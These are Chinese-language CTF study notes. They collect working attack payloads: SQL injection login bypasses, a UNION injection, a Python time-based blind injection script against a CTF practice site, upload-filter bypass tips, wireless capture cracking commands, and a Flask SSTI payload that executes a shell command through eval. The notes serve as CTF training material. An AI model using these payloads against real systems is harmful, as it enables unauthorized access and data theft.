# 学习基本思路

    * 第一阶段，拿到题目要能看懂
    * 第二阶段，分析出题目逻辑

    * 做了一个月题啥也不会也是正常的...

    * 学习曲线坑爹，怎么开始不重要，但是一定要坚持下来

    * 保持练习强度，量变引起质变，瓶颈期，不存在的
    * 新手过招，靠的是技巧,高手过招，靠的是技术

# WEB

.index.php.swp 文件可能隐藏源代码
16进制编码可以绕过注入

## sql绕过，万能密码

假设sql语句如下：
select * from user where username='用户名' and password='密码'

---

### 数据类型

sql里面弱类型的比较，以下情况都会为true：

- 1='1'
- 1='1.0'
- 1='1后接字母(再后面有数字也可以)'
- 0='除了非0数字开头的字符串'
    uname=admin
    &passwd=admin'||'1'='1

### 双等号

username=p'='&password=p'='
### 特殊截断符号“%00

username=a'+0;%00&password=

## 回显注入

?name=admin' and 1=2 union select 1,2,group_concat(flag) from flag--+

## 延时注入

import requests

import string

s=requests.session()

url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"

flag=''

guess=string.lowercase+string.uppercase+string.digits

for i in range(33):

for st in guess:

headers={"x-forwarded-for":"1'+"+"(select case when(substr((select flag from flag) from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1" %(i,st)}

try:

res=s.get(url,headers=headers,timeout=4)

except requests.exceptions.ReadTimeout:

flag+=st

print "flag:",flag

break

print "result:"+flag

## 图片上传

upload success, but not php!
multipart/form-data变换一下大小写，再把第二个Content-Type改成图片类

## kindeditor4.1.7

泄漏路径问题，漏洞根源位于/php/file_manager_json.php。

#杂碎

培根密码,当铺密码解密，JS/VBS/ASP加密解密  
cap无线密码破解-aircrack-win  
cap包无线解密，airdecap-ng -e SSID -p PASSWORD
MP3Stego Decode.exe -X -P PASSWORD
rz sz命令

## string 命令提取字符串，tr去除换行

strings qweqwe.pcapng | grep '^[a-z0-9]\{14\}$' | tr -d '\n' > test.txt  

## 工具

cheat engine
## 隐写

outguess -r 图片名 文件名

## flask ssti

{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("ls").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 
